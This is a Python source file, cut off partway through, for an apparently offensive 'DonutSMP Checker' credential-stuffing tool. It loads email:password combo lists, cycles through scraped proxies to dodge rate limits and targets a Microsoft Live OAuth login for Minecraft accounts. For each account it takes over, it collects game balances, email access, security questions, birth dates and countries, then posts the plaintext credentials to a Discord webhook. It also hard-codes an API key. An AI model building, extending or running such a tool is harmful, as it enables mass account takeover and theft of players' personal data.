import os
import sys
import json
import time
import random
import socket
import string
import base64
import hashlib
import hmac
import logging
import threading
import traceback
import configparser
import urllib3
import warnings
import requests
import socks
import re
import uuid
import readchar
from io import StringIO
from datetime import datetime, timezone
from collections import deque, defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple, Union
from colorama import Fore, Style, init
from console import utils
from tkinter import Tk, filedialog
from urllib.parse import urlparse, parse_qs

# Initialize colorama for colored console output
init(autoreset=True)

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore")

# Constants
VERSION = "3.0.0"
sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
DONUTSMP_API_KEY = "baf466a88b9f477fb3249b777ae0478d"
GITHUB_REPO = "https://github.com/MSMC-Team/msmc-donutsmp"
GITHUB_API = "https://api.github.com/repos/MSMC-Team/msmc-donutsmp/releases/latest"

# Premium ASCII Logo
logo = Fore.MAGENTA + '''
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║    ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗                     ║
║    ████╗  ██║██╔═══██║██║   ██║██╔══██╗                    ║
║    ██╔██╗ ██║██║   ██║██║   ██║███████║                    ║
║    ██║╚██╗██║██║   ██║╚██╗ ██╔╝██╔══██║                    ║
║    ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║                    ║
║    ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝                    ║
║                                                              ║
║                    🍩 DONUTSMP CHECKER 🍩                    ║
║                      ULTIMATE EDITION                       ║
║                      VERSION ''' + VERSION + '''                    ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
''' + Style.RESET_ALL

# Global variables with thread locks
Combos = []
proxylist = []
fname = ""
hits, bad, twofa, cpm, cpm1, errors, retries, checked, vm, sfa, mfa, maxretries, xgp, xgpu, other = 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
stats_lock = threading.Lock()
start_time = time.time()
proxytype = ""
screen = ""

# Setup logging
class ColoredFormatter(logging.Formatter):
    """Custom formatter with colors for console output"""
    
    grey = "\x1b[38;21m"
    yellow = "\x1b[33;21m"
    red = "\x1b[31;21m"
    bold_red = "\x1b[31;1m"
    green = "\x1b[32;21m"
    blue = "\x1b[34;21m"
    reset = "\x1b[0m"
    
    FORMATS = {
        logging.DEBUG: grey + "%(asctime)s - %(name)s - %(levelname)s - %(message)s" + reset,
        logging.INFO: green + "%(asctime)s - %(name)s - %(levelname)s - %(message)s" + reset,
        logging.WARNING: yellow + "%(asctime)s - %(name)s - %(levelname)s - %(message)s" + reset,
        logging.ERROR: red + "%(asctime)s - %(name)s - %(levelname)s - %(message)s" + reset,
        logging.CRITICAL: bold_red + "%(asctime)s - %(name)s - %(levelname)s - %(message)s" + reset
    }
    
    def format(self, record):
        log_fmt = self.FORMATS.get(record.levelno)
        formatter = logging.Formatter(log_fmt, datefmt='%Y-%m-%d %H:%M:%S')
        return formatter.format(record)

def setup_logging(log_level=logging.INFO):
    """Setup comprehensive logging system with file and console outputs"""
    
    # Create logs directory if it doesn't exist
    Path("logs").mkdir(exist_ok=True)
    
    # Create logger
    logger = logging.getLogger("DonutSMPChecker")
    logger.setLevel(log_level)
    
    # Console handler with colors
    console_handler = logging.StreamHandler()
    console_handler.setLevel(log_level)
    console_handler.setFormatter(ColoredFormatter())
    
    # File handler for all logs
    log_filename = f"logs/checker_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
    file_handler = logging.FileHandler(log_filename, encoding='utf-8')
    file_handler.setLevel(logging.DEBUG)
    file_formatter = logging.Formatter(
        '%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    file_handler.setFormatter(file_formatter)
    
    # Error file handler
    error_filename = f"logs/errors_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
    error_handler = logging.FileHandler(error_filename, encoding='utf-8')
    error_handler.setLevel(logging.ERROR)
    error_handler.setFormatter(file_formatter)
    
    # Add handlers
    logger.addHandler(console_handler)
    logger.addHandler(file_handler)
    logger.addHandler(error_handler)
    
    return logger

# Initialize logger
logger = setup_logging()

class SecurityManager:
    """Handle encryption and sensitive data securely"""
    
    def __init__(self):
        self.key = self._get_or_create_key()
        self.cipher_suite = None
        self._initialize_cipher()
        logger.info("Security Manager initialized")
    
    def _get_or_create_key(self) -> bytes:
        """Get or create encryption key"""
        key_file = Path(".key")
        if key_file.exists():
            with open(key_file, 'rb') as f:
                return f.read()
        else:
            # Generate a new key
            key = os.urandom(32)  # 256-bit key
            with open(key_file, 'wb') as f:
                f.write(key)
            # Set file permissions (Unix-like systems)
            if hasattr(os, 'chmod'):
                os.chmod(key_file, 0o600)  # Read/write for owner only
            return key
    
    def _initialize_cipher(self):
        """Initialize the cipher suite"""
        try:
            from cryptography.fernet import Fernet
            # Derive a key from our master key
            derived_key = base64.urlsafe_b64encode(hashlib.sha256(self.key).digest())
            self.cipher_suite = Fernet(derived_key)
        except ImportError:
            logger.warning("cryptography library not available, using fallback encryption")
            self.cipher_suite = None
    
    def encrypt_sensitive_data(self, data: str) -> str:
        """Encrypt sensitive data"""
        if not self.cipher_suite:
            # Fallback encryption if cryptography is not available
            key = self.key
            encoded = []
            for i in range(len(data)):
                key_c = key[i % len(key)]
                encoded.append(chr(ord(data[i]) ^ key_c))
            return base64.urlsafe_b64encode(''.join(encoded).encode()).decode()
        
        return self.cipher_suite.encrypt(data.encode()).decode()
    
    def decrypt_sensitive_data(self, encrypted_data: str) -> str:
        """Decrypt sensitive data"""
        if not self.cipher_suite:
            # Fallback decryption if cryptography is not available
            key = self.key
            decoded = base64.urlsafe_b64decode(encrypted_data).decode()
            result = []
            for i in range(len(decoded)):
                key_c = key[i % len(key)]
                result.append(chr(ord(decoded[i]) ^ key_c))
            return ''.join(result)
        
        return self.cipher_suite.decrypt(encrypted_data.encode()).decode()
    
    def hash_password(self, password: str, salt: bytes = None) -> Tuple[str, bytes]:
        """Hash password with salt using PBKDF2"""
        if salt is None:
            salt = os.urandom(32)
        # Use PBKDF2 with HMAC-SHA256
        key = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
        return key.hex(), salt
    
    def generate_hmac(self, data: str) -> str:
        """Generate HMAC for data integrity verification"""
        return hmac.new(self.key, data.encode(), hashlib.sha256).hexdigest()
    
    def verify_hmac(self, data: str, hmac_signature: str) -> bool:
        """Verify HMAC signature"""
        expected_hmac = self.generate_hmac(data)
        return hmac.compare_digest(expected_hmac, hmac_signature)

class RateLimiter:
    """Advanced rate limiter with sliding window algorithm"""
    
    def __init__(self, max_requests: int = 10, time_window: int = 1):
        self.max_requests = max_requests
        self.time_window = time_window
        self.requests = deque()
        self.lock = threading.Lock()
        logger.debug(f"Rate limiter initialized: {max_requests} requests per {time_window} seconds")
    
    def acquire(self) -> bool:
        """Acquire permission to make a request"""
        with self.lock:
            now = time.time()
            # Remove old requests outside the time window
            while self.requests and self.requests[0] < now - self.time_window:
                self.requests.popleft()
            
            if len(self.requests) < self.max_requests:
                self.requests.append(now)
                return True
            
            # Calculate wait time
            wait_time = self.time_window - (now - self.requests[0])
            if wait_time > 0:
                time.sleep(wait_time)
                return self.acquire()
            return False

class ProxyManager:
    """Advanced proxy management with validation and rotation"""
    
    def __init__(self):
        self.proxies: List[Dict[str, str]] = []
        self.valid_proxies: List[Dict[str, str]] = []
        self.failed_proxies: Dict[str, int] = defaultdict(int)
        self.proxy_stats: Dict[str, Dict[str, Any]] = defaultdict(dict)
        self.lock = threading.Lock()
        self.validation_semaphore = threading.Semaphore(50)  # Limit concurrent validations
        logger.info("Proxy Manager initialized")
    
    def add_proxy(self, proxy: Dict[str, str]):
        """Add a proxy to the list"""
        with self.lock:
            self.proxies.append(proxy)
            # Initialize stats for this proxy
            proxy_str = str(proxy)
            if proxy_str not in self.proxy_stats:
                self.proxy_stats[proxy_str] = {
                    'success': 0,
                    'failure': 0,
                    'last_used': None,
                    'response_time': []
                }
    
    def validate_proxy(self, proxy: Dict[str, str]) -> bool:
        """Validate a single proxy"""
        with self.validation_semaphore:
            try:
                proxy_url = list(proxy.values())[0]
                start_time = time.time()
                
                response = requests.get(
                    'http://httpbin.org/ip',
                    proxies=proxy,
                    timeout=10,
                    verify=False
                )
                
                response_time = time.time() - start_time
                
                if response.status_code == 200:
                    proxy_str = str(proxy)
                    with self.lock:
                        self.proxy_stats[proxy_str]['response_time'].append(response_time)
                        # Keep only the last 10 response times
                        if len(self.proxy_stats[proxy_str]['response_time']) > 10:
                            self.proxy_stats[proxy_str]['response_time'] = self.proxy_stats[proxy_str]['response_time'][-10:]
                    
                    logger.debug(f"Proxy validated: {proxy_url} - IP: {response.json().get('origin')} - Time: {response_time:.2f}s")
                    return True
            except Exception as e:
                logger.debug(f"Proxy validation failed: {proxy} - {str(e)}")
                return False
    
    def validate_proxies(self, proxies: List[Dict[str, str]] = None) -> List[Dict[str, str]]:
        """Validate multiple proxies concurrently"""
        if proxies is None:
            proxies = self.proxies
        
        if not proxies:
            return []
        
        logger.info(f"Validating {len(proxies)} proxies...")
        
        # Use ThreadPoolExecutor for concurrent validation
        with ThreadPoolExecutor(max_workers=50) as executor:
            results = list(executor.map(self.validate_proxy, proxies))
        
        valid = [proxy for proxy, is_valid in zip(proxies, results) if is_valid]
        
        with self.lock:
            self.valid_proxies = valid
            # Initialize stats for valid proxies
            for proxy in valid:
                proxy_str = str(proxy)
                if proxy_str not in self.proxy_stats:
                    self.proxy_stats[proxy_str] = {
                        'success': 0,
                        'failure': 0,
                        'last_used': None,
                        'response_time': []
                    }
        
        logger.info(f"Validated {len(valid)}/{len(proxies)} proxies")
        return valid
    
    def get_proxy(self) -> Optional[Dict[str, str]]:
        """Get a working proxy with intelligent rotation"""
        with self.lock:
            if not self.valid_proxies:
                return None
            
            # Sort by success rate and average response time
            sorted_proxies = sorted(
                self.valid_proxies,
                key=lambda p: (
                    # Higher failure rate comes first (we want to try to rehabilitate them)
                    -self.proxy_stats[str(p)].get('failure', 0),
                    # Then by last used time (older first)
                    self.proxy_stats[str(p)].get('last_used', 0),
                    # Finally by average response time (faster first)
                    sum(self.proxy_stats[str(p)].get('response_time', [1])) / max(1, len(self.proxy_stats[str(p)].get('response_time', [1])))
                )
            )
            
            proxy = sorted_proxies[0]
            proxy_str = str(proxy)
            self.proxy_stats[proxy_str]['last_used'] = time.time()
            return proxy
    
    def mark_proxy_success(self, proxy: Dict[str, str]):
        """Mark a proxy as successful"""
        with self.lock:
            proxy_str = str(proxy)
            if proxy_str in self.proxy_stats:
                self.proxy_stats[proxy_str]['success'] += 1
    
    def mark_proxy_failure(self, proxy: Dict[str, str]):
        """Mark a proxy as failed and remove if too many failures"""
        with self.lock:
            proxy_str = str(proxy)
            if proxy_str in self.proxy_stats:
                self.proxy_stats[proxy_str]['failure'] += 1
                
                # Remove proxy if failure rate is too high
                stats = self.proxy_stats[proxy_str]
                total = stats['success'] + stats['failure']
                if total > 10 and stats['failure'] / total > 0.7:
                    logger.warning(f"Removing proxy due to high failure rate: {proxy}")
                    if proxy in self.valid_proxies:
                        self.valid_proxies.remove(proxy)
    
    def get_proxy_stats(self) -> Dict[str, Any]:
        """Get statistics about proxy performance"""
        with self.lock:
            stats = {
                'total_proxies': len(self.proxies),
                'valid_proxies': len(self.valid_proxies),
                'success_rate': 0,
                'avg_response_time': 0
            }
            
            if self.valid_proxies:
                total_success = sum(self.proxy_stats[str(p)].get('success', 0) for p in self.valid_proxies)
                total_failures = sum(self.proxy_stats[str(p)].get('failure', 0) for p in self.valid_proxies)
                total_requests = total_success + total_failures
                
                if total_requests > 0:
                    stats['success_rate'] = total_success / total_requests * 100
                
                # Calculate average response time
                all_response_times = []
                for proxy in self.valid_proxies:
                    response_times = self.proxy_stats[str(proxy)].get('response_time', [])
                    all_response_times.extend(response_times)
                
                if all_response_times:
                    stats['avg_response_time'] = sum(all_response_times) / len(all_response_times)
            
            return stats

class Config:
    """Configuration management with validation and defaults"""
    
    def __init__(self):
        self.data = {}
        self.security_manager = SecurityManager()
        self.config_file = "config.ini"
    
    def set(self, key, value):
        """Set a configuration value"""
        self.data[key] = value
    
    def get(self, key, default=None):
        """Get a configuration value with optional default"""
        return self.data.get(key, default)
    
    def load_config(self):
        """Load configuration from file"""
        def str_to_bool(value):
            """Convert string to boolean"""
            return value.lower() in ('yes', 'true', 't', '1')
        
        if not os.path.isfile(self.config_file):
            self.create_default_config()
        
        try:
            config = configparser.ConfigParser()
            # Explicitly read the config file with UTF-8 encoding
            with open(self.config_file, 'r', encoding='utf-8') as f:
                config.read_file(f)
            
            # Load Settings section
            if 'Settings' in config:
                global maxretries
                maxretries = int(config['Settings'].get('Max Retries', '5'))
                self.set('webhook', str(config['Settings'].get('Webhook', '')))
                self.set('message', str(config['Settings'].get('WebhookMessage', '🍩 **NEW DONUTSMP ACCOUNT HIT!** 🍩 ||`<email>:<password>`||')))
                self.set('donutsmp_api_key', str(config['Settings'].get('DonutSMP API Key', DONUTSMP_API_KEY)))
                self.set('rate_limit_requests', int(config['Settings'].get('Rate Limit Requests', '10')))
                self.set('rate_limit_window', int(config['Settings'].get('Rate Limit Window', '1')))
                self.set('timeout', int(config['Settings'].get('Timeout', '30')))
                self.set('user_agent', str(config['Settings'].get('User Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')))
                self.set('display_captures', str_to_bool(config['Settings'].get('Display Captures In Console', 'True')))
                self.set('save_failed_captures', str_to_bool(config['Settings'].get('Save Failed Captures', 'True')))
                self.set('auto_update', str_to_bool(config['Settings'].get('Auto Update', 'False')))
                self.set('check_updates', str_to_bool(config['Settings'].get('Check For Updates', 'True')))
                
                # Set log level
                log_level_str = config['Settings'].get('Log Level', 'INFO')
                log_level = getattr(logging, log_level_str.upper(), logging.INFO)
                logging.getLogger().setLevel(log_level)
            
            # Load Scraper section
            if 'Scraper' in config:
                self.set('autoscrape', int(config['Scraper'].get('Auto Scrape Minutes', '5')))
                self.set('scrape_on_startup', str_to_bool(config['Scraper'].get('Scrape On Startup', 'True')))
                self.set('validate_proxies', str_to_bool(config['Scraper'].get('Validate Proxies', 'True')))
                self.set('proxy_timeout', int(config['Scraper'].get('Proxy Timeout', '10')))
                self.set('max_proxies_per_source', int(config['Scraper'].get('Max Proxies Per Source', '500')))
                self.set('remove_dead_proxies', str_to_bool(config['Scraper'].get('Remove Dead Proxies', 'True')))
                self.set('min_proxy_success_rate', int(config['Scraper'].get('Min Proxy Success Rate', '70')))
            
            # Load Captures section
            if 'Captures' in config:
                self.set('donutsmpname', str_to_bool(config['Captures'].get('DonutSMP Name', 'True')))
                self.set('donutsmprank', str_to_bool(config['Captures'].get('DonutSMP Rank', 'True')))
                self.set('donutsmplevel', str_to_bool(config['Captures'].get('DonutSMP Level', 'True')))
                self.set('donutsmpbalance', str_to_bool(config['Captures'].get('DonutSMP Balance', 'True')))
                self.set('donutsmpplaytime', str_to_bool(config['Captures'].get('DonutSMP Playtime', 'True')))
                self.set('donutsmpkills', str_to_bool(config['Captures'].get('DonutSMP Kills', 'True')))
                self.set('donutsmpdeaths', str_to_bool(config['Captures'].get('DonutSMP Deaths', 'True')))
                self.set('donutsmpblocksbroken', str_to_bool(config['Captures'].get('DonutSMP Blocks Broken', 'True')))
                self.set('donutsmpblocksplaced', str_to_bool(config['Captures'].get('DonutSMP Blocks Placed', 'True')))
                self.set('donutsmpshards', str_to_bool(config['Captures'].get('DonutSMP Shards', 'True')))
                self.set('donutsmpbasefound', str_to_bool(config['Captures'].get('DonutSMP Base Found', 'True')))
                self.set('donutsmplocation', str_to_bool(config['Captures'].get('DonutSMP Location', 'True')))
                self.set('donutsmpmobs_killed', str_to_bool(config['Captures'].get('DonutSMP Mobs Killed', 'True')))
                self.set('donutsmpmoney_spent', str_to_bool(config['Captures'].get('DonutSMP Money Spent', 'True')))
                self.set('donutsmpmoney_made', str_to_bool(config['Captures'].get('DonutSMP Money Made', 'True')))
                self.set('optifinecape', str_to_bool(config['Captures'].get('Optifine Cape', 'True')))
                self.set('mcapes', str_to_bool(config['Captures'].get('Minecraft Capes', 'True')))
                self.set('access', str_to_bool(config['Captures'].get('Email Access', 'True')))
                self.set('namechange', str_to_bool(config['Captures'].get('Name Change Availability', 'True')))
                self.set('lastchanged', str_to_bool(config['Captures'].get('Last Name Change', 'True')))
                self.set('skin_url', str_to_bool(config['Captures'].get('Skin URL', 'True')))
                self.set('migration_status', str_to_bool(config['Captures'].get('Migration Status', 'True')))
                self.set('security_questions', str_to_bool(config['Captures'].get('Security Questions', 'True')))
                self.set('birth_date', str_to_bool(config['Captures'].get('Birth Date', 'True')))
                self.set('country', str_to_bool(config['Captures'].get('Country', 'True')))
            
            # Load Security section
            if 'Security' in config:
                self.set('encrypt_passwords', str_to_bool(config['Security'].get('Encrypt Passwords', 'True')))
                self.set('secure_webhook', str_to_bool(config['Security'].get('Secure Webhook', 'True')))
                self.set('rate_limit_webhook', str_to_bool(config['Security'].get('Rate Limit Webhook', 'True')))
                self.set('hide_passwords_console', str_to_bool(config['Security'].get('Hide Passwords In Console', 'True')))
                self.set('hide_passwords_files', str_to_bool(config['Security'].get('Hide Passwords In Files', 'True')))
                self.set('use_hmac', str_to_bool(config['Security'].get('Use HMAC Authentication', 'False')))
                self.set('api_key_rotation', str_to_bool(config['Security'].get('API Key Rotation', 'False')))
                self.set('session_timeout', int(config['Security'].get('Session Timeout', '3600')))
            
            # Load Performance section
            if 'Performance' in config:
                self.set('max_threads', int(config['Performance'].get('Max Threads', '300')))
                self.set('min_threads', int(config['Performance'].get('Min Threads', '50')))
                self.set('thread_adjustment', str_to_bool(config['Performance'].get('Thread Adjustment', 'True')))
                self.set('adaptive_threading', str_to_bool(config['Performance'].get('Adaptive Threading', 'True')))
                self.set('memory_limit', int(config['Performance'].get('Memory Limit', '1024')))
                self.set('garbage_collection', str_to_bool(config['Performance'].get('Garbage Collection', 'True')))
                self.set('connection_pool_size', int(config['Performance'].get('Connection Pool Size', '100')))
                self.set('request_timeout', int(config['Performance'].get('Request Timeout', '15')))
                self.set('retry_delay', int(config['Performance'].get('Retry Delay', '1')))
                self.set('max_consecutive_errors', int(config['Performance'].get('Max Consecutive Errors', '10')))
            
            # Load Output section
            if 'Output' in config:
                self.set('timestamp_format', str(config['Output'].get('Timestamp Format', '%Y-%m-%d %H:%M:%S')))
                self.set('create_separate_folders', str_to_bool(config['Output'].get('Create Separate Folders', 'True')))
                self.set('include_statistics', str_to_bool(config['Output'].get('Include Statistics In Files', 'True')))
                self.set('compress_output', str_to_bool(config['Output'].get('Compress Output Files', 'False')))
                self.set('auto_delete_old', str_to_bool(config['Output'].get('Auto Delete Old Results', 'False')))
                self.set('retention_days', int(config['Output'].get('Result Retention Days', '30')))
                self.set('backup_results', str_to_bool(config['Output'].get('Backup Results', 'True')))
                self.set('backup_interval', int(config['Output'].get('Backup Interval Hours', '24')))
            
            # Load Notifications section
            if 'Notifications' in config:
                self.set('discord_notifications', str_to_bool(config['Notifications'].get('Discord Notifications', 'True')))
                self.set('telegram_notifications', str_to_bool(config['Notifications'].get('Telegram Notifications', 'False')))
                self.set('webhook_timeout', int(config['Notifications'].get('Webhook Timeout', '10')))
                self.set('notification_retries', int(config['Notifications'].get('Notification Retries', '3')))
                self.set('embed_color', int(config['Notifications'].get('Embed Color', '5814783')))
                self.set('show_thumbnail', str_to_bool(config['Notifications'].get('Show Thumbnail', 'True')))
                self.set('show_timestamp', str_to_bool(config['Notifications'].get('Show Timestamp', 'True')))
                self.set('mention_role', str(config['Notifications'].get('Mention Role', 'None')))
                self.set('custom_footer', str(config['Notifications'].get('Custom Footer', '🍩 Ultimate DonutSMP Checker')))
                self.set('custom_avatar', str(config['Notifications'].get('Custom Avatar', 'https://i.imgur.com/M4m2vjM.png')))
            
            logger.info("Configuration loaded successfully")
            return True
        except Exception as e:
            logger.error(f"Error loading configuration: {e}")
            return False
    
    def create_default_config(self):
        """Create a default configuration file"""
        config = configparser.ConfigParser(allow_no_value=True)
        
        # Settings section
        config['Settings'] = {
            'Webhook': 'paste your discord webhook here',
            'Max Retries': '5',
            'WebhookMessage': '🍩 **NEW DONUTSMP ACCOUNT HIT!** 🍩 ||`<email>:<password>`||',
            'DonutSMP API Key': DONUTSMP_API_KEY,
            'Rate Limit Requests': '10',
            'Rate Limit Window': '1',
            'Log Level': 'INFO',
            'Timeout': '30',
            'User Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Display Captures In Console': 'True',
            'Save Failed Captures': 'True',
            'Auto Update': 'False',
            'Check For Updates': 'True'
        }
        
        # Scraper section
        config['Scraper'] = {
            'Auto Scrape Minutes': '5',
            'Scrape On Startup': 'True',
            'Validate Proxies': 'True',
            'Proxy Timeout': '10',
            'Max Proxies Per Source': '500',
            'Remove Dead Proxies': 'True',
            'Min Proxy Success Rate': '70'
        }
        
        # Captures section
        config['Captures'] = {
            'DonutSMP Name': 'True',
            'DonutSMP Rank': 'True',
            'DonutSMP Level': 'True',
            'DonutSMP Balance': 'True',
            'DonutSMP Playtime': 'True',
            'DonutSMP Kills': 'True',
            'DonutSMP Deaths': 'True',
            'DonutSMP Blocks Broken': 'True',
            'DonutSMP Blocks Placed': 'True',
            'DonutSMP Shards': 'True',
            'DonutSMP Base Found': 'True',
            'DonutSMP Location': 'True',
            'DonutSMP Mobs Killed': 'True',
            'DonutSMP Money Spent': 'True',
            'DonutSMP Money Made': 'True',
            'Optifine Cape': 'True',
            'Minecraft Capes': 'True',
            'Email Access': 'True',
            'Name Change Availability': 'True',
            'Last Name Change': 'True',
            'Skin URL': 'True',
            'Migration Status': 'True',
            'Security Questions': 'True',
            'Birth Date': 'True',
            'Country': 'True'
        }
        
        # Security section
        config['Security'] = {
            'Encrypt Passwords': 'True',
            'Secure Webhook': 'True',
            'Rate Limit Webhook': 'True',
            'Hide Passwords In Console': 'True',
            'Hide Passwords In Files': 'True',
            'Use HMAC Authentication': 'False',
            'API Key Rotation': 'False',
            'Session Timeout': '3600'
        }
        
        # Performance section
        config['Performance'] = {
            'Max Threads': '300',
            'Min Threads': '50',
            'Thread Adjustment': 'True',
            'Adaptive Threading': 'True',
            'Memory Limit': '1024',
            'Garbage Collection': 'True',
            'Connection Pool Size': '100',
            'Request Timeout': '15',
            'Retry Delay': '1',
            'Max Consecutive Errors': '10'
        }
        
        # Output section
        config['Output'] = {
            'Timestamp Format': '%Y-%m-%d %H:%M:%S',
            'Create Separate Folders': 'True',
            'Include Statistics In Files': 'True',
            'Compress Output Files': 'False',
            'Auto Delete Old Results': 'False',
            'Result Retention Days': '30',
            'Backup Results': 'True',
            'Backup Interval Hours': '24'
        }
        
        # Notifications section
        config['Notifications'] = {
            'Discord Notifications': 'True',
            'Telegram Notifications': 'False',
            'Webhook Timeout': '10',
            'Notification Retries': '3',
            'Embed Color': '5814783',
            'Show Thumbnail': 'True',
            'Show Timestamp': 'True',
            'Mention Role': 'None',
            'Custom Footer': '🍩 Ultimate DonutSMP Checker',
            'Custom Avatar': 'https://i.imgur.com/M4m2vjM.png'
        }
        
        try:
            with open(self.config_file, 'w', encoding='utf-8') as configfile:
                config.write(configfile)
            logger.info("Created default configuration file")
            return True
        except Exception as e:
            logger.error(f"Error creating default configuration: {e}")
            return False

# Initialize configuration
config = Config()

# Helper functions for formatting numbers and time
def format_number(num):
    """Format large numbers with K, M, B suffixes"""
    try:
        num = int(num)
        if num >= 1000000000:  # Billion
            return f"{num/1000000000:.1f}B"
        elif num >= 1000000:  # Million
            return f"{num/1000000:.1f}M"
        elif num >= 1000:  # Thousand
            return f"{num/1000:.1f}K"
        else:
            return str(num)
    except (ValueError, TypeError):
        return "N/A"

def format_time(seconds):
    """Format time in seconds to human-readable format"""
    try:
        seconds = int(seconds)
        days = seconds // 86400
        hours = (seconds % 86400) // 3600
        minutes = (seconds % 3600) // 60
        
        if days > 0:
            return f"{days}d {hours}h {minutes}m"
        elif hours > 0:
            return f"{hours}h {minutes}m"
        else:
            return f"{minutes}m"
    except (ValueError, TypeError):
        return "N/A"

def format_time_elapsed(seconds):
    """Format elapsed time in a detailed readable way"""
    seconds = int(seconds)
    minutes, seconds = divmod(seconds, 60)
    hours, minutes = divmod(minutes, 60)
    days, hours = divmod(hours, 24)
    
    if days > 0:
        return f"{days}d {hours}h {minutes}m {seconds}s"
    elif hours > 0:
        return f"{hours}h {minutes}m {seconds}s"
    elif minutes > 0:
        return f"{minutes}m {seconds}s"
    else:
        return f"{seconds}s"

def calculate_percentage(current, total):
    """Calculate percentage with proper handling of division by zero"""
    if total == 0:
        return 0
    return (current / total) * 100

def create_progress_bar(percentage, width=50):
    """Create a visual progress bar"""
    filled = int(width * percentage / 100)
    bar = '█' * filled + '-' * (width - filled)
    return f"|{bar}| {percentage:.1f}%"

class Capture:
    """Handle captured account data and notifications"""
    
    def __init__(self, email, password, name, capes, uuid, token, type):
        self.email = email
        self.password = password
        self.name = name
        self.capes = capes
        self.uuid = uuid
        self.token = token
        self.type = type
        self.donutsmp = None
        self.donutsmp_rank = None
        self.donutsmp_level = None
        self.donutsmp_balance = None
        self.donutsmp_playtime = None
        self.donutsmp_kills = None
        self.donutsmp_deaths = None
        self.donutsmp_blocks_broken = None
        self.donutsmp_blocks_placed = None
        self.donutsmp_shards = None
        self.donutsmp_base_found = None
        self.donutsmp_location = None
        self.donutsmp_mobs_killed = None
        self.donutsmp_money_spent = None
        self.donutsmp_money_made = None
        self.cape = None
        self.access = None
        self.namechanged = None
        self.lastchanged = None
        self.skin_url = None
        self.migration_status = None
        self.security_questions = None
        self.birth_date = None
        self.country = None
        
    def builder(self):
        """Build a formatted capture string"""
        message = f"Email: {self.email}\nPassword: {self.password}\nName: {self.name}\nCapes: {self.capes}\nAccount Type: {self.type}"
        
        if self.donutsmp is not None: message += f"\nDonutSMP: {self.donutsmp}"
        if self.donutsmp_rank is not None: message += f"\nDonutSMP Rank: {self.donutsmp_rank}"
        if self.donutsmp_level is not None: message += f"\nDonutSMP Level: {self.donutsmp_level}"
        if self.donutsmp_balance is not None: message += f"\nDonutSMP Balance: {self.donutsmp_balance}"
        if self.donutsmp_playtime is not None: message += f"\nDonutSMP Playtime: {self.donutsmp_playtime}"
        if self.donutsmp_kills is not None: message += f"\nDonutSMP Kills: {self.donutsmp_kills}"
        if self.donutsmp_deaths is not None: message += f"\nDonutSMP Deaths: {self.donutsmp_deaths}"
        if self.donutsmp_blocks_broken is not None: message += f"\nDonutSMP Blocks Broken: {self.donutsmp_blocks_broken}"
        if self.donutsmp_blocks_placed is not None: message += f"\nDonutSMP Blocks Placed: {self.donutsmp_blocks_placed}"
        if self.donutsmp_shards is not None: message += f"\nDonutSMP Shards: {self.donutsmp_shards}"
        if self.donutsmp_base_found is not None: message += f"\nDonutSMP Base Found: {self.donutsmp_base_found}"
        if self.donutsmp_location is not None: message += f"\nDonutSMP Location: {self.donutsmp_location}"
        if self.donutsmp_mobs_killed is not None: message += f"\nDonutSMP Mobs Killed: {self.donutsmp_mobs_killed}"
        if self.donutsmp_money_spent is not None: message += f"\nDonutSMP Money Spent: {self.donutsmp_money_spent}"
        if self.donutsmp_money_made is not None: message += f"\nDonutSMP Money Made: {self.donutsmp_money_made}"
        if self.cape is not None: message += f"\nOptifine Cape: {self.cape}"
        if self.access is not None: message += f"\nEmail Access: {self.access}"
        if self.namechanged is not None: message += f"\nCan Change Name: {self.namechanged}"
        if self.lastchanged is not None: message += f"\nLast Name Change: {self.lastchanged}"
        if self.skin_url is not None: message += f"\nSkin URL: {self.skin_url}"
        if self.migration_status is not None: message += f"\nMigration Status: {self.migration_status}"
        if self.security_questions is not None: message += f"\nSecurity Questions: {self.security_questions}"
        if self.birth_date is not None: message += f"\nBirth Date: {self.birth_date}"
        if self.country is not None: message += f"\nCountry: {self.country}"
        
        return message + "\n============================\n"
    
    def notify(self):
        """Send Discord notification with rich embed"""
        global errors
        
        if not config.get('discord_notifications', True):
            return
        
        try:
            # Helper function to format values - display "N/A" for empty/None values
            def format_value(value):
                if value is None or value == "None" or value == "":
                    return "N/A"
                return value
            
            # Format all values
            email = format_value(self.email)
            password = format_value(self.password)
            name = format_value(self.name)
            account_type = format_value(self.type)
            donutsmp = format_value(self.donutsmp)
            rank = format_value(self.donutsmp_rank)
            level = format_value(self.donutsmp_level)
            balance = format_number(self.donutsmp_balance)
            playtime = format_value(self.donutsmp_playtime)
            kills = format_number(self.donutsmp_kills)
            deaths = format_number(self.donutsmp_deaths)
            blocks_broken = format_number(self.donutsmp_blocks_broken)
            blocks_placed = format_number(self.donutsmp_blocks_placed)
            shards = format_number(self.donutsmp_shards)
            base_found = format_value(self.donutsmp_base_found)
            location = format_value(self.donutsmp_location)
            mobs_killed = format_number(self.donutsmp_mobs_killed)
            money_spent = format_number(self.donutsmp_money_spent)
            money_made = format_number(self.donutsmp_money_made)
            optifine_cape = format_value(self.cape)
            mc_capes = format_value(self.capes)
            email_access = format_value(self.access)
            name_change = format_value(self.namechanged)
            last_changed = format_value(self.lastchanged)
            skin_url = format_value(self.skin_url)
            migration_status = format_value(self.migration_status)
            security_questions = format_value(self.security_questions)
            birth_date = format_value(self.birth_date)
            country = format_value(self.country)
            
            # Determine status color and emoji
